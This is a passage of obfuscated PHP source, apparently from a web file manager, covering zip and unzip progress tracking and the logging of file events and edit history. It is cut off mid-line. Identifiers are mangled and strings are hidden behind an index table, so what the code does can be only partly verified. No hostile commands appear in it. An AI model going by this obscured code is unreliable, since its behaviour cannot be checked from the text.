$âŸ˜İã[1870])); Hook::bind($âŸ˜İã[1871], array($this, $âŸ˜İã[1872])); $ÉÖ·¾¸ =& $this->task; $ÉÖ·¾¸[$âŸ˜İã[1873]] = $âŸ˜İã[1262]; if (!$ÉÖ·¾¸[$âŸ˜İã[1642]]) { $ÉÖ·¾¸[$âŸ˜İã[1642]] = LNG($âŸ˜İã[1874]); } } protected function endAfter() { $ÆåÏµ”Ö =& $_SERVER[£ğ°ÖØø]; parent::endAfter(); Hook::unbind($ÆåÏµ”Ö[1868], array($this, $ÆåÏµ”Ö[1869])); Hook::unbind($ÆåÏµ”Ö[1261], array($this, $ÆåÏµ”Ö[1870])); Hook::unbind($ÆåÏµ”Ö[1871], array($this, $ÆåÏµ”Ö[1872])); } public function updateAfter() { $ÇÆòêì =& $_SERVER[£ğ°ÖØø]; $¥¥ÓöªÃ =& $this->task; if (!$¥¥ÓöªÃ[$ÇÆòêì[1124]] || !$¥¥ÓöªÃ[$ÇÆòêì[827]]) { if ($¥¥ÓöªÃ[$ÇÆòêì[1873]] != $ÇÆòêì[389]) { return; } } if ($¥¥ÓöªÃ[$ÇÆòêì[1873]] == $ÇÆòêì[1262]) { $ÂÕæ‹‰ = 0; if ($¥¥ÓöªÃ[$ÇÆòêì[1808]]) { $ÂÕæ‹‰ = $¥¥ÓöªÃ[$ÇÆòêì[1809]] / $¥¥ÓöªÃ[$ÇÆòêì[1808]]; } $¥¥ÓöªÃ[$ÇÆòêì[1757]] = $ÂÕæ‹‰ * 0.3; } else { if ($¥¥ÓöªÃ[$ÇÆòêì[1873]] == $ÇÆòêì[389]) { $ÂÕæ‹‰ = $¥¥ÓöªÃ[$ÇÆòêì[1756]] / $¥¥ÓöªÃ[$ÇÆòêì[1124]]; $¥¥ÓöªÃ[$ÇÆòêì[1757]] = 0.3 + $ÂÕæ‹‰ * 0.4; } else { if ($¥¥ÓöªÃ[$ÇÆòêì[1873]] == $ÇÆòêì[110]) { $¼Äóñ€× = 0; if ($¥¥ÓöªÃ[$ÇÆòêì[1810]] == $ÇÆòêì[110]) { $¼Äóñ€× = $¥¥ÓöªÃ[$ÇÆòêì[1809]]; } $ÂÕæ‹‰ = ($¥¥ÓöªÃ[$ÇÆòêì[1813]] + $¼Äóñ€×) / $¥¥ÓöªÃ[$ÇÆòêì[827]]; $¥¥ÓöªÃ[$ÇÆòêì[1757]] = 0.3 + 0.4 + $ÂÕæ‹‰ * 0.3; } } } if ($¥¥ÓöªÃ[$ÇÆòêì[1757]] > 0) { $êÏæœëò = timeFloat() - $¥¥ÓöªÃ[$ÇÆòêì[1759]] - $¥¥ÓöªÃ[$ÇÆòêì[1762]]; $¥¥ÓöªÃ[$ÇÆòêì[1763]] = $êÏæœëò * (1 - $¥¥ÓöªÃ[$ÇÆòêì[1757]]) / $¥¥ÓöªÃ[$ÇÆòêì[1757]]; } } public function addFile($•ì–ğ‚) { $Õæºˆşı =& $_SERVER[£ğ°ÖØø]; $Ááœ•´Ş =& $this->task; $™çäÒòÌ = IO::info($•ì–ğ‚); $Ááœ•´Ş[$Õæºˆşı[1806]] = $™çäÒòÌ[$Õæºˆşı[32]]; $Ááœ•´Ş[$Õæºˆşı[1808]] = $™çäÒòÌ[$Õæºˆşı[79]]; $Ááœ•´Ş[$Õæºˆşı[1809]] = 0; $Ááœ•´Ş[$Õæºˆşı[1126]] = $Õæºˆşı[1829]; $Ááœ•´Ş[$Õæºˆşı[1810]] = $Õæºˆşı[1262]; $Ááœ•´Ş[$Õæºˆşı[827]] = $™çäÒòÌ[$Õæºˆşı[79]]; $Ááœ•´Ş[$Õæºˆşı[1124]] = 1; $Ü¹Ø¼Ù— = 0; $Ááœ•´Ş[$Õæºˆşı[1817]] = array($Õæºˆşı[1818] => $Ü¹Ø¼Ù— + 1, $Õæºˆşı[503] => $™çäÒòÌ[$Õæºˆşı[32]], $Õæºˆşı[87] => $™çäÒòÌ[$Õæºˆşı[87]], $Õæºˆşı[591] => $™çäÒòÌ[$Õæºˆşı[591]] ? $™çäÒòÌ[$Õæºˆşı[591]] : $™çäÒòÌ[$Õæºˆşı[87]]); $this->update(); } public function zipEvent($ ¨ĞÉ¼£, $»±ÈçÉñ, $ùéÚô—©, $ÚÄ÷Æ¹) { $Ú¥ÖÆ± =& $_SERVER[£ğ°ÖØø]; $´›µ‡¸Ë =& $this->task; $´›µ‡¸Ë[$Ú¥ÖÆ±[1806]] = get_path_this($»±ÈçÉñ); $´›µ‡¸Ë[$Ú¥ÖÆ±[1808]] = $ÚÄ÷Æ¹; $´›µ‡¸Ë[$Ú¥ÖÆ±[1809]] = $ùéÚô—©; $´›µ‡¸Ë[$Ú¥ÖÆ±[1126]] = $ ¨ĞÉ¼£ == $Ú¥ÖÆ±[1875] ? $Ú¥ÖÆ±[1876] : $Ú¥ÖÆ±[1877]; $´›µ‡¸Ë[$Ú¥ÖÆ±[1810]] = $Ú¥ÖÆ±[12]; $´›µ‡¸Ë[$Ú¥ÖÆ±[827]] = $ÚÄ÷Æ¹; $´›µ‡¸Ë[$Ú¥ÖÆ±[1873]] = $Ú¥ÖÆ±[389]; $this->update(); } public function unzipAfter($Éìü÷“Ô) { $Ã×óõş‚ =& $_SERVER[£ğ°ÖØø]; $æğ¶‘Õ‰ =& $this->task; $æğ¶‘Õ‰[$Ã×óõş‚[1873]] = $Ã×óõş‚[110]; $ªó”‡ÇÅ = IO::infoWithChildren($Éìü÷“Ô); $ª©›€¼„ = 0; $æğ¶‘Õ‰[$Ã×óõş‚[1817]] = array($Ã×óõş‚[1818] => $ª©›€¼„ + 1, $Ã×óõş‚[503] => $ªó”‡ÇÅ[$Ã×óõş‚[32]], $Ã×óõş‚[87] => $ªó”‡ÇÅ[$Ã×óõş‚[87]], $Ã×óõş‚[591] => $ªó”‡ÇÅ[$Ã×óõş‚[591]] ? $ªó”‡ÇÅ[$Ã×óõş‚[591]] : $ªó”‡ÇÅ[$Ã×óõş‚[87]]); if ($ªó”‡ÇÅ[$Ã×óõş‚[33]] == $Ã×óõş‚[230]) { $æğ¶‘Õ‰[$Ã×óõş‚[1124]] = 1; } else { $æğ¶‘Õ‰[$Ã×óõş‚[1124]] = $ªó”‡ÇÅ[$Ã×óõş‚[82]][$Ã×óõş‚[80]]; } $æğ¶‘Õ‰[$Ã×óõş‚[1126]] = $Ã×óõş‚[12]; $æğ¶‘Õ‰[$Ã×óõş‚[1810]] = 0; $æğ¶‘Õ‰[$Ã×óõş‚[1756]] = 0; $æğ¶‘Õ‰[$Ã×óõş‚[1808]] = 0; $æğ¶‘Õ‰[$Ã×óõş‚[1809]] = 0; $æğ¶‘Õ‰[$Ã×óõş‚[1806]] = $Ã×óõş‚[12]; $æğ¶‘Õ‰[$Ã×óõş‚[1813]] = 0; $æğ¶‘Õ‰[$Ã×óõş‚[827]] = $ªó”‡ÇÅ[$Ã×óõş‚[79]]; $this->update(); self::log($Ã×óõş‚[1878] . json_encode(array($æğ¶‘Õ‰, $ªó”‡ÇÅ))); } public function nameParse($¿âÈö’) { $Ò„şØ²Ç =& $_SERVER[£ğ°ÖØø]; $úÛö†”Ô =& $this->task; if ($úÛö†”Ô[$Ò„şØ²Ç[1873]] == $Ò„şØ²Ç[1262]) { $úÛö†”Ô[$Ò„şØ²Ç[1873]] = $Ò„şØ²Ç[389]; $úÛö†”Ô[$Ò„şØ²Ç[1813]] = 0; $úÛö†”Ô[$Ò„şØ²Ç[827]] = 0; } $úÍÍìÛ = get_path_this($¿âÈö’); if (strstr($úÍÍìÛ, $Ò„şØ²Ç[10])) { $úÛö†”Ô[$Ò„şØ²Ç[1756]] += 1; $úÛö†”Ô[$Ò„şØ²Ç[1124]] += 1; } $úÛö†”Ô[$Ò„şØ²Ç[1806]] = $¿âÈö’; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ÕáÃØúã =& $_SERVER[£ğ°ÖØø]; parent::startAfter(); Hook::bind($ÕáÃØúã[1879], array($this, $ÕáÃØúã[1869])); Hook::bind($ÕáÃØúã[1871], array($this, $ÕáÃØúã[1872])); $œ‘´‹àá =& $this->task; $œ‘´‹àá[$ÕáÃØúã[1873]] = $ÕáÃØúã[1262]; if (!$œ‘´‹àá[$ÕáÃØúã[1642]]) { $œ‘´‹àá[$ÕáÃØúã[1642]] = LNG($ÕáÃØúã[1880]); } } protected function endAfter() { $œÊ×¢…Ë =& $_SERVER[£ğ°ÖØø]; parent::endAfter(); Hook::unbind($œÊ×¢…Ë[1879], array($this, $œÊ×¢…Ë[1869])); Hook::unbind($œÊ×¢…Ë[1871], array($this, $œÊ×¢…Ë[1872])); } public function updateAfter() { $Î«±¤‡İ =& $_SERVER[£ğ°ÖØø]; $¬ ùã°È =& $this->task; if (!$¬ ùã°È[$Î«±¤‡İ[1124]] || !$¬ ùã°È[$Î«±¤‡İ[827]]) { return; } if ($¬ ùã°È[$Î«±¤‡İ[1873]] == $Î«±¤‡İ[1262]) { $Î¾ÍúÖÉ = $¬ ùã°È[$Î«±¤‡İ[1809]]; if ($¬ ùã°È[$Î«±¤‡İ[1810]] != $Î«±¤‡İ[1262]) { $Î¾ÍúÖÉ = 0; } $Š•–÷Ä§ = ($¬ ùã°È[$Î«±¤‡İ[1813]] + $Î¾ÍúÖÉ) / $¬ ùã°È[$Î«±¤‡İ[827]]; $¬ ùã°È[$Î«±¤‡İ[1757]] = $Š•–÷Ä§ * 0.3; } else { if ($¬ ùã°È[$Î«±¤‡İ[1873]] == $Î«±¤‡İ[389]) { $Š•–÷Ä§ = $¬ ùã°È[$Î«±¤‡İ[1756]] / $¬ ùã°È[$Î«±¤‡İ[1124]]; $¬ ùã°È[$Î«±¤‡İ[1757]] = 0.3 + $Š•–÷Ä§ * 0.5; } else { if ($¬ ùã°È[$Î«±¤‡İ[1873]] == $Î«±¤‡İ[110]) { $Š•–÷Ä§ = 0; if ($¬ ùã°È[$Î«±¤‡İ[1808]]) { $Š•–÷Ä§ = $¬ ùã°È[$Î«±¤‡İ[1809]] / $¬ ùã°È[$Î«±¤‡İ[1808]]; } $¬ ùã°È[$Î«±¤‡İ[1757]] = 0.3 + 0.5 + $Š•–÷Ä§ * 0.2; } } } if ($¬ ùã°È[$Î«±¤‡İ[1757]] > 0) { $ù‚ÖÒ¢± = timeFloat() - $¬ ùã°È[$Î«±¤‡İ[1759]] - $¬ ùã°È[$Î«±¤‡İ[1762]]; $¬ ùã°È[$Î«±¤‡İ[1763]] = $ù‚ÖÒ¢± * (1 - $¬ ùã°È[$Î«±¤‡İ[1757]]) / $¬ ùã°È[$Î«±¤‡İ[1757]]; } } public function copyFileStart($ŠŒ²ıÂ—, $±ìî©ï’, $á¢‚¸’˜, $ğàğğèÌ, $ËŠ‡Öœç, $ãÌÇşÚ) { $¿¦éŠêè =& $_SERVER[£ğ°ÖØø]; parent::copyFileStart($ŠŒ²ıÂ—, $±ìî©ï’, $á¢‚¸’˜, $ğàğğèÌ, $ËŠ‡Öœç, $ãÌÇşÚ); $¯óÒæƒ® =& $this->task; if ($¯óÒæƒ®[$¿¦éŠêè[1873]] == $¿¦éŠêè[389]) { $¯óÒæƒ®[$¿¦éŠêè[1873]] = $¿¦éŠêè[110]; } $this->update(); } public function copyFileEnd($¶Ä“îä, $Îö­Á‚, $”Ç©ÔŠé, $€ò§Ğ½, $ùß«ÜÛç, $ªÇÄ¦ß³) { $ÕòƒÂØ³ =& $_SERVER[£ğ°ÖØø]; $ÛŠ„ÉóÒ =& $this->task; $ÛŠ„ÉóÒ[$ÕòƒÂØ³[1809]] = $ÛŠ„ÉóÒ[$ÕòƒÂØ³[1808]]; $ÛŠ„ÉóÒ[$ÕòƒÂØ³[1813]] += $ÛŠ„ÉóÒ[$ÕòƒÂØ³[1808]]; $ÛŠ„ÉóÒ[$ÕòƒÂØ³[1810]] = $ÕòƒÂØ³[12]; $this->update(); } public function zipEvent($ÎÏ‡ÉŞå, $×™¦Èäı, $¬Áš£², $ÇÎ÷–×¨) { $ÆÒ¸¶¦¼ =& $_SERVER[£ğ°ÖØø]; $Ò×šó¸í =& $this->task; $Ò×šó¸í[$ÆÒ¸¶¦¼[1806]] = get_path_this($×™¦Èäı); $Ò×šó¸í[$ÆÒ¸¶¦¼[1808]] = $ÇÎ÷–×¨; $Ò×šó¸í[$ÆÒ¸¶¦¼[1809]] = $¬Áš£²; $Ò×šó¸í[$ÆÒ¸¶¦¼[1126]] = $ÎÏ‡ÉŞå == $ÆÒ¸¶¦¼[1881] ? $ÆÒ¸¶¦¼[1876] : $ÆÒ¸¶¦¼[1877]; $Ò×šó¸í[$ÆÒ¸¶¦¼[1810]] = $ÆÒ¸¶¦¼[12]; $Ò×šó¸í[$ÆÒ¸¶¦¼[827]] = $ÇÎ÷–×¨; $Ò×šó¸í[$ÆÒ¸¶¦¼[1873]] = $ÆÒ¸¶¦¼[389]; $this->update(); } public function nameParse($ÕÒ‹ –¥) { $Ãì©Ô¯õ =& $_SERVER[£ğ°ÖØø]; $‰ ›ñŒ¤ =& $this->task; if ($‰ ›ñŒ¤[$Ãì©Ô¯õ[1756]] < $‰ ›ñŒ¤[$Ãì©Ô¯õ[1124]]) { $™¨£ë´¢ = get_path_this($ÕÒ‹ –¥); if (strstr($™¨£ë´¢, $Ãì©Ô¯õ[10])) { $‰ ›ñŒ¤[$Ãì©Ô¯õ[1756]] += 1; } } if ($‰ ›ñŒ¤[$Ãì©Ô¯õ[1873]] == $Ãì©Ô¯õ[1262]) { $‰ ›ñŒ¤[$Ãì©Ô¯õ[1873]] = $Ãì©Ô¯õ[389]; } $‰ ›ñŒ¤[$Ãì©Ô¯õ[1806]] = $ÕÒ‹ –¥; $this->update(); } } goto c»Âª–“ò; D¸‹¯×Ÿ¥ñ: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\162\x63\145\137\x65\x76\x65\156\x74"; protected $dataAuto = array(array("\x63\162\145\141\x74\145\x54\151\x6d\x65", "\x74\x69\155\145", "\151\156\x73\145\x72\164", "\146\165\156\x63\x74\151\157\156"), array("\x64\x65\x73\143", '', "\151\x6e\163\145\x72\164\54\165\x70\x64\141\164\x65\54\163\145\154\x65\143\164", "\x6a\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($èÌÏ¥íÄ, $Ì»ğÌÎÌ, $©­´†à½ = '') { $å÷°üûú =& $_SERVER[£ğ°ÖØø]; if (!$this->eventSave) { return; } $£÷–†ô¼ = Model($å÷°üûú[1401])->sourceInfo($èÌÏ¥íÄ); if (!$£÷–†ô¼) { return !1; } if ($this->isDisableEvent($£÷–†ô¼, $Ì»ğÌÎÌ)) { return; } if ($©­´†à½ && is_string($©­´†à½)) { $©­´†à½ = array($å÷°üûú[1993] => $©­´†à½); } $ÀÅÜ‹…ç = defined($å÷°üûú[2180]) ? USER_ID : 0; $²†Œó«æ = array($å÷°üûú[500] => $èÌÏ¥íÄ, $å÷°üûú[2181] => $£÷–†ô¼[$å÷°üûú[192]], $å÷°üûú[2182] => $£÷–†ô¼[$å÷°üûú[32]], $å÷°üûú[591] => !empty($£÷–†ô¼[$å÷°üûú[591]]) ? $£÷–†ô¼[$å÷°üûú[591]] : $å÷°üûú[12], $å÷°üûú[1746] => $ÀÅÜ‹…ç, $å÷°üûú[505] => $Ì»ğÌÎÌ, $å÷°üûú[1748] => $©­´†à½); $this->addSystemLog($Ì»ğÌÎÌ, $²†Œó«æ); unset($²†Œó«æ[$å÷°üûú[2182]], $²†Œó«æ[$å÷°üûú[591]]); return $this->add($²†Œó«æ); } private function addSystemLog($¼†Çá‰–, $è˜Õ•şÏ) { $Ö‹»†æ˜ =& $_SERVER[£ğ°ÖØø]; if ($¼†Çá‰– == $Ö‹»†æ˜[2183]) { $¼†Çá‰– = $è˜Õ•şÏ[$Ö‹»†æ˜[535]][$Ö‹»†æ˜[2184]]; } else { if (in_array($¼†Çá‰–, array($Ö‹»†æ˜[1933], $Ö‹»†æ˜[2185]))) { $¼†Çá‰– = $è˜Õ•şÏ[$Ö‹»†æ˜[535]][$Ö‹»†æ˜[171]]; } } $‚Êƒ”ÄË = array_merge($è˜Õ•şÏ, array($Ö‹»†æ˜[2186] => $è˜Õ•şÏ[$Ö‹»†æ˜[193]], $Ö‹»†æ˜[2187] => $è˜Õ•şÏ[$Ö‹»†æ˜[2187]])); Hook::trigger($Ö‹»†æ˜[2188], $Ö‹»†æ˜[2189] . $¼†Çá‰–, $è˜Õ•şÏ); Model($Ö‹»†æ˜[1897])->addLog($Ö‹»†æ˜[2189] . $¼†Çá‰–, $‚Êƒ”ÄË); } private function isDisableEvent($†»ÛÏÚï, $Ş¶Ã„â) { $¹¿÷°ç =& $_SERVER[£ğ°ÖØø]; if ($†»ÛÏÚï[$¹¿÷°ç[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($Ş¶Ã„â == $¹¿÷°ç[1922]) { return !1; } return !0; } public function eventCreate($Å£‰×ò, $ìÌŸéïô) { $“’À•ıó =& $_SERVER[£ğ°ÖØø]; $ãìœòòÀ = Model($“’À•ıó[1401])->sourceInfo($Å£‰×ò); $ã–äŒÌ = array($“’À•ıó[2184] => $ìÌŸéïô, $“’À•ıó[32] => $ãìœòòÀ[$“’À•ıó[32]]); return $this->addEvent($Å£‰×ò, $“’À•ıó[2183], $ã–äŒÌ); } public function eventFileEdit($¡ì©Ş†İ) { $ØÔ›àÛÔ =& $_SERVER[£ğ°ÖØø]; $†Éàï—Ú = array($ØÔ›àÛÔ[2190] => $_SERVER[$ØÔ›àÛÔ[2191]], $ØÔ›àÛÔ[2192] => strtolower(ACTION)); if (isset($GLOBALS[$ØÔ›àÛÔ[7]][$ØÔ›àÛÔ[2193]])) { $†Éàï—Ú[$ØÔ›àÛÔ[2193]] = $ØÔ›àÛÔ[91]; } return $this->addEvent($¡ì©Ş†İ, $ØÔ›àÛÔ[1923], $†Éàï—Ú); } public function eventRecycle($»Ã„ª», $í÷Û•¦°) { return $this->addEvent($»Ã„ª», $_SERVER[£ğ°ÖØø][2185], $í÷Û•¦°); } private static $_removeLast = ''; public function eventRemove($õ€Èš°ß) { $Ê·—Ò±ù =& $_SERVER[£ğ°ÖØø]; self::$_removeLast = $õ€Èš°ß; $–Ò­êµ = Model($Ê·—Ò±ù[1401])->sourceInfo($õ€Èš°ß); $Øş‡Ñû = array_field_key($–Ò­êµ, array($Ê·—Ò±ù[193], $Ê·—Ò±ù[550], $Ê·—Ò±ù[514], $Ê·—Ò±ù[593])); $§àö¸ÒÙ = array($Ê·—Ò±ù[171] => $–Ò­êµ[$Ê·—Ò±ù[32]], $Ê·—Ò±ù[2192] => ACTION, $Ê·—Ò±ù[2194] => $Øş‡Ñû); return $this->addEvent($–Ò­êµ[$Ê·—Ò±ù[192]], $Ê·—Ò±ù[1922], $§àö¸ÒÙ); } public function eventShare($ª™íÆ¯Ô, $ùİ´äÆ¤) { return $this->addEvent($ª™íÆ¯Ô, $_SERVER[£ğ°ÖØø][1933], $ùİ´äÆ¤); } public function eventMove($à€Ì¾ÁÌ, $¡¾’òŞ‘, $ßŒŠÔî“) { $æ«Ûüû =& $_SERVER[£ğ°ÖØø]; if (self::$_removeLast == $à€Ì¾ÁÌ) { return; } $‰ªÌ‰óÖ = Model($æ«Ûüû[1401]); $»«ìŸØ = $‰ªÌ‰óÖ->sourceInfo($à€Ì¾ÁÌ); $èé·±¯ı = $‰ªÌ‰óÖ->sourceInfo($¡¾’òŞ‘); $ú”–Ò‰Ì = $‰ªÌ‰óÖ->sourceInfo($ßŒŠÔî“); $‚şŞõ¥¶ = array($æ«Ûüû[1224] => $¡¾’òŞ‘, $æ«Ûüû[2195] => $èé·±¯ı[$æ«Ûüû[32]], $æ«Ûüû[2171] => !empty($èé·±¯ı[$æ«Ûüû[591]]) ? $èé·±¯ı[$æ«Ûüû[591]] : $æ«Ûüû[12], $æ«Ûüû[1225] => $ßŒŠÔî“, $æ«Ûüû[2196] => $ú”–Ò‰Ì[$æ«Ûüû[32]], $æ«Ûüû[2197] => !empty($ú”–Ò‰Ì[$æ«Ûüû[591]]) ? $ú”–Ò‰Ì[$æ«Ûüû[591]] : $æ«Ûüû[12]); $this->addEvent($à€Ì¾ÁÌ, $æ«Ûüû[629], $‚şŞõ¥¶); $»«ìŸØ = $‰ªÌ‰óÖ->sourceInfo($à€Ì¾ÁÌ); $‚şŞõ¥¶ = array($æ«Ûüû[193] => $»«ìŸØ[$æ«Ûüû[193]], $æ«Ûüû[32] => $»«ìŸØ[$æ«Ûüû[32]]); $this->addEvent($¡¾’òŞ‘, $æ«Ûüû[2198], $‚şŞõ¥¶); } public function eventCopy($Ù·‰«Ö) { $this->eventCreate($Ù·‰«Ö, $_SERVER[£ğ°ÖØø][627]); } public function eventRename($ÆÏïéóá, $İ²‚ÚÛ, $÷– Áúä) { $¸å§ùø =& $_SERVER[£ğ°ÖØø]; $…Ï›‹Û = array($¸å§ùø[1224] => $İ²‚ÚÛ, $¸å§ùø[1225] => $÷– Áúä); return $this->addEvent($ÆÏïéóá, $¸å§ùø[1415], $…Ï›‹Û); } public function eventAddComment($ğü¿Ò¡Å, $¶ëÔÄî½) { return $this->addEvent($ğü¿Ò¡Å, $_SERVER[£ğ°ÖØø][2199], $¶ëÔÄî½); } public function eventAddDesc($£•º™Øó, $Ä´íÔî) { return $this->addEvent($£•º™Øó, $_SERVER[£ğ°ÖØø][2200], $Ä´íÔî); } public function listBySource($å‹€æœ‘) { $³¾¿àüã =& $_SERVER[£ğ°ÖØø]; $ĞùĞÔôæ = Model($³¾¿àüã[1401])->sourceInfo($å‹€æœ‘); $şä“ÛĞƒ = array($³¾¿àüã[500] => $å‹€æœ‘); if ($ĞùĞÔôæ[$³¾¿àüã[494]] == $³¾¿àüã[91]) { $ªÈÒ¤Âì = Model($³¾¿àüã[1401])->listSearchChildren($å‹€æœ‘, 20000); $ªÈÒ¤Âì[] = $å‹€æœ‘ . $³¾¿àüã[463]; $şä“ÛĞƒ = array($³¾¿àüã[193] => array($³¾¿àüã[7], $ªÈÒ¤Âì)); } $Åß÷ÛêÔ = $this->where($şä“ÛĞƒ)->order($³¾¿àüã[2201])->selectPage(); if ($Åß÷ÛêÔ[$³¾¿àüã[451]][$³¾¿àüã[452]] == 0) { $Åß÷ÛêÔ[$³¾¿àüã[451]][$³¾¿àüã[452]] = 1; $Åß÷ÛêÔ[$³¾¿àüã[454]] = array(array($³¾¿àüã[500] => $å‹€æœ‘, $³¾¿àüã[2181] => $ĞùĞÔôæ[$³¾¿àüã[192]], $³¾¿àüã[1746] => $ĞùĞÔôæ[$³¾¿àüã[536]], $³¾¿àüã[505] => $³¾¿àüã[2202], $³¾¿àüã[506] => $ĞùĞÔôæ[$³¾¿àüã[231]], $³¾¿àüã[1748] => $³¾¿àüã[12])); } return $this->eventListParse($Åß÷ÛêÔ, $å‹€æœ‘); } private function eventListParse($˜‚ç†ËÌ, $ŠÑ¦®°¬) { $æîÖÑ»š =& $_SERVER[£ğ°ÖØø]; $ÂŞÃ”ı— = $˜‚ç†ËÌ[$æîÖÑ»š[454]]; $£ ±’ôÛ = array_to_keyvalue($ÂŞÃ”ı—, $æîÖÑ»š[12], $æîÖÑ»š[193]); $¤üºáà¹ = array_to_keyvalue($ÂŞÃ”ı—, $æîÖÑ»š[12], $æîÖÑ»š[2187]); foreach ($ÂŞÃ”ı— as $×ß°©åë) { $µ ˜•Èı = $×ß°©åë[$æîÖÑ»š[535]]; if ($×ß°©åë[$æîÖÑ»š[33]] == $æîÖÑ»š[629] && isset($µ ˜•Èı[$æîÖÑ»š[1224]])) { $£ ±’ôÛ[] = $µ ˜•Èı[$æîÖÑ»š[1224]] . $æîÖÑ»š[12]; $£ ±’ôÛ[] = $µ ˜•Èı[$æîÖÑ»š[1225]] . $æîÖÑ»š[12]; } if ($×ß°©åë[$æîÖÑ»š[33]] == $æîÖÑ»š[2198] && isset($µ ˜•Èı[$æîÖÑ»š[193]])) { $£ ±’ôÛ[] = $µ ˜•Èı[$æîÖÑ»š[193]] . $æîÖÑ»š[12]; } } $£ ±’ôÛ = array_merge($£ ±’ôÛ, $¤üºáà¹, array($ŠÑ¦®°¬ . $æîÖÑ»š[12])); $£ ±’ôÛ = array_unique($£ ±’ôÛ); $ó…¤îêË = array_unique(array_to_keyvalue($ÂŞÃ”ı—, $æîÖÑ»š[12], $æîÖÑ»š[1755])); $¹”®Ìé = Model($æîÖÑ»š[607])->userListInfo($ó…¤îêË); $ÎúŞûâã = Model($æîÖÑ»š[888])->sourceListInfo($£ ±’ôÛ, !0); foreach ($ÂŞÃ”ı— as &$×ß°©åë) { if ($×ß°©åë[$æîÖÑ»š[33]] == $æîÖÑ»š[629] && isset($×ß°©åë[$æîÖÑ»š[535]][$æîÖÑ»š[1224]])) { $×ß°©åë[$æîÖÑ»š[535]][$æîÖÑ»š[1224]] = $ÎúŞûâã[$×ß°©åë[$æîÖÑ»š[535]][$æîÖÑ»š[1224]]]; $×ß°©åë[$æîÖÑ»š[535]][$æîÖÑ»š[1225]] = $ÎúŞûâã[$×ß°©åë[$æîÖÑ»š[535]][$æîÖÑ»š[1225]]]; } if ($×ß°©åë[$æîÖÑ»š[33]] == $æîÖÑ»š[2198] && isset($×ß°©åë[$æîÖÑ»š[535]][$æîÖÑ»š[193]])) { $×ß°©åë[$æîÖÑ»š[535]][$æîÖÑ»š[193]] = $ÎúŞûâã[$×ß°©åë[$æîÖÑ»š[535]][$æîÖÑ»š[193]]]; } $×ß°©åë[$æîÖÑ»š[90]] = $ÎúŞûâã[$×ß°©åë[$æîÖÑ»š[193]]]; $×ß°©åë[$æîÖÑ»š[2203]] = $ÎúŞûâã[$×ß°©åë[$æîÖÑ»š[2187]]]; if ($×ß°©åë[$æîÖÑ»š[33]] == $æîÖÑ»š[1922]) { $×ß°©åë[$æîÖÑ»š[2203]] = $×ß°©åë[$æîÖÑ»š[90]]; $×ß°©åë[$æîÖÑ»š[2187]] = $×ß°©åë[$æîÖÑ»š[2203]][$æîÖÑ»š[193]]; $×ß°©åë[$æîÖÑ»š[90]] = !1; $×ß°©åë[$æîÖÑ»š[193]] = $æîÖÑ»š[12]; } $×ß°©åë[$æîÖÑ»š[2130]] = $¹”®Ìé[$×ß°©åë[$æîÖÑ»š[1755]]]; } unset($×ß°©åë); $˜‚ç†ËÌ[$æîÖÑ»š[454]] = $ÂŞÃ”ı—; return $˜‚ç†ËÌ; } public function removeBySource($«·ÂÈÜŠ) { $Œ™¡Ã‹õ = array($_SERVER[£ğ°ÖØø][500] => $«·ÂÈÜŠ); $this->where($Œ™¡Ã‹õ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\x72\143\145\x5f\x68\151\163\164\157\x72\x79"; public function historyCount($ãææİëœ) { $Ûêİéùİ =& $_SERVER[£ğ°ÖØø]; if (!$ãææİëœ) { return array(); } if (is_string($ãææİëœ) || is_int($ãææİëœ)) { $ãææİëœ = array($ãææİëœ); } $Ï™ëƒ ¶ = array($Ûêİéùİ[193], $Ûêİéùİ[1987] => $Ûêİéùİ[574]); $°Üœâ¦ı = array($Ûêİéùİ[193] => array($Ûêİéùİ[7], $ãææİëœ)); $áŸÙï®é = $this->field($Ï™ëƒ ¶)->where($°Üœâ¦ı)->group($Ûêİéùİ[193])->select(); return array_to_keyvalue($áŸÙï®é, $Ûêİéùİ[193], $Ûêİéùİ[574]); } public function addHistory($ñ·ßÍ°µ, $üÔÅ™É = '') { $±ûÎŞâ£ =& $_SERVER[£ğ°ÖØø]; $¾§·ã„ = array($±ûÎŞâ£[500] => $ñ·ßÍ°µ[$±ûÎŞâ£[193]], $±ûÎŞâ£[1746] => isset($ñ·ßÍ°µ[$±ûÎŞâ£[538]]) ? $ñ·ßÍ°µ[$±ûÎŞâ£[538]] : $ñ·ßÍ°µ[$±ûÎŞâ£[536]], $±ûÎŞâ£[551] => $ñ·ßÍ°µ[$±ûÎŞâ£[550]], $±ûÎŞâ£[626] => $ñ·ßÍ°µ[$±ûÎŞâ£[79]], $±ûÎŞâ£[2204] => $üÔÅ™É); if ($GLOBALS[$±ûÎŞâ£[6]][$±ûÎŞâ£[92]][$±ûÎŞâ£[1285]] >= 1) { $this->historyAutoClear($¾§·ã„[$±ûÎŞâ£[193]]); $this->add($¾§·ã„); } Hook::trigger($±ûÎŞâ£[2205], $¾§·ã„); Model($±ûÎŞâ£[2206])->eventFileEdit($ñ·ßÍ°µ[$±ûÎŞâ£[193]]); } private function historyAutoClear($ßÀ”Í²) { $¸™²íõ =& $_SERVER[£ğ°ÖØø]; $ş˜åœ¥ = Model($¸™²íõ[834])->get($¸™²íõ[1307]); $ëÓóœ—‚ = intval($GLOBALS[$¸™²íõ[6]][$¸™²íõ[92]][$¸™²íõ[1285]]); $îÁ“ŞÅ = $ş˜åœ¥ == $¸™²íõ[1308] ? min(5, $ëÓóœ—‚) : $ëÓóœ—‚; $îÁ“ŞÅ = $îÁ“ŞÅ <= 0 ? 0 : $îÁ“ŞÅ - 1; if ($îÁ“ŞÅ >= 499) { return; } $ÙÇíËğ‡ = array($¸™²íõ[500] => $ßÀ”Í²); $ÆŸ–„³… = $this->field($¸™²íõ[2207])->where($ÙÇíËğ‡)->order($¸™²íõ[2201])->select(); if (!$ÆŸ–„³… || $îÁ“ŞÅ >= count($ÆŸ–„³…)) { return; } $¬Ñ¶úïÏ = array_to_keyvalue($ÆŸ–„³…, $¸™²íõ[12], $¸™²íõ[484]); $¬Ñ¶úïÏ = array_slice($¬Ñ¶úïÏ, $îÁ“ŞÅ); $›•œÇ¸‰ = array_to_keyvalue($ÆŸ–„³…, 